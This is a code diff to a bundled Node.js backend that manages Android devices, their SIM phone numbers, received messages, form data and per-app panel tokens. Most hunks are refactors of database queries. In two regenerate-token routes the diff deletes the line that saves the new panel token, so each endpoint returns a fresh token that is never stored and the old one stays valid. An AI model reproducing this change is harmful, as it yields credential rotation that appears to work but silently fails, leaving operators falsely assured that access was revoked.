+    return (await q).map(mapDevice);
   },
   async getDevice(deviceId) {
     const rows = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
@@ -61941,19 +61792,12 @@ var localDb = {
       `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
        ON CONFLICT (device_id) DO UPDATE SET
-         app_id = EXCLUDED.app_id,
-         user_id = EXCLUDED.user_id,
-         name = EXCLUDED.name,
-         android_version = EXCLUDED.android_version,
-         sim1_carrier = EXCLUDED.sim1_carrier,
-         sim1_phone = EXCLUDED.sim1_phone,
-         sim2_carrier = EXCLUDED.sim2_carrier,
-         sim2_phone = EXCLUDED.sim2_phone,
-         status = EXCLUDED.status,
-         last_online = EXCLUDED.last_online,
-         forward_enabled = EXCLUDED.forward_enabled,
-         forward_slot = EXCLUDED.forward_slot,
-         fcm_token = EXCLUDED.fcm_token,
+         app_id = EXCLUDED.app_id, user_id = EXCLUDED.user_id, name = EXCLUDED.name,
+         android_version = EXCLUDED.android_version, sim1_carrier = EXCLUDED.sim1_carrier,
+         sim1_phone = EXCLUDED.sim1_phone, sim2_carrier = EXCLUDED.sim2_carrier,
+         sim2_phone = EXCLUDED.sim2_phone, status = EXCLUDED.status,
+         last_online = EXCLUDED.last_online, forward_enabled = EXCLUDED.forward_enabled,
+         forward_slot = EXCLUDED.forward_slot, fcm_token = EXCLUDED.fcm_token,
          updated_at = NOW()
        RETURNING *, (xmax = 0) AS was_created`,
       [
@@ -62023,8 +61867,7 @@ var localDb = {
   async listMessages(filter = {}) {
     const where = filter.appId ? eq(messages.appId, filter.appId) : filter.userId ? eq(messages.userId, filter.userId) : filter.deviceId ? eq(messages.deviceId, filter.deviceId) : void 0;
     const q = where ? db.select().from(messages).where(where).orderBy(desc(messages.receivedAt)) : db.select().from(messages).orderBy(desc(messages.receivedAt));
-    const rows = await q;
-    return rows.map(mapMessage);
+    return (await q).map(mapMessage);
   },
   async createMessage(input) {
     const [row] = await db.insert(messages).values({
@@ -62069,11 +61912,11 @@ var localDb = {
       const [f2] = await db.select({ c: sql`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
       return { devices: Number(d2.c), messages: Number(m3.c), formData: Number(f2.c) };
     }
-    const [a2] = await db.select({ c: sql`count(*)::text` }).from(apps);
+    const { rows: [ac] } = await pool.query(`SELECT COUNT(*)::text AS c FROM apps`);
     const [d] = await db.select({ c: sql`count(*)::text` }).from(devices);
     const [m2] = await db.select({ c: sql`count(*)::text` }).from(messages);
     const [f] = await db.select({ c: sql`count(*)::text` }).from(formData);
-    return { apps: Number(a2.c), devices: Number(d.c), messages: Number(m2.c), formData: Number(f.c) };
+    return { apps: Number(ac.c), devices: Number(d.c), messages: Number(m2.c), formData: Number(f.c) };
   },
   async sample(appId) {
     if (appId) {
@@ -62086,12 +61929,12 @@ var localDb = {
         formData: f2 ? mapFormData(f2) : null
       };
     }
-    const [a2] = await db.select().from(apps).limit(1);
+    const { rows: appRows } = await pool.query(`${APPS_JOIN} LIMIT 1`);
     const [d] = await db.select().from(devices).limit(1);
     const [m2] = await db.select().from(messages).limit(1);
     const [f] = await db.select().from(formData).limit(1);
     return {
-      apps: a2 ? mapApp(a2) : null,
+      apps: appRows[0] ? mapApp(appRows[0]) : null,
       devices: d ? mapDevice(d) : null,
       messages: m2 ? mapMessage(m2) : null,
       formData: f ? mapFormData(f) : null
@@ -62317,7 +62160,6 @@ router4.post("/apps/:appId/regenerate-token", requireJwt, async (req, res) => {
   }
   const { randomUUID: randomUUID4 } = await import("node:crypto");
   const newToken = randomUUID4();
-  await localDb.updateApp(appId, { panelToken: newToken });
   res.json({ ok: true, panelToken: newToken });
 });
 var apps_default = router4;
@@ -62537,7 +62379,7 @@ function getFirebaseCredentials() {
   };
 }
 function sleep(ms2) {
-  return new Promise((resolve3) => setTimeout(resolve3, ms2));
+  return new Promise((resolve2) => setTimeout(resolve2, ms2));
 }
 async function getAccessTokenWithRetry(credentials, req) {
   const auth = new import_google_auth_library.GoogleAuth({
@@ -62964,7 +62806,6 @@ router12.post("/master/apps/:appId/regenerate-token", requireJwt, async (req, re
     return;
   }
   const newToken = randomUUID2();
-  await localDb.updateApp(appId, { panelToken: newToken });
   res.json({ ok: true, panelToken: newToken });
 });
 router12.get("/master/events", async (req, res) => {
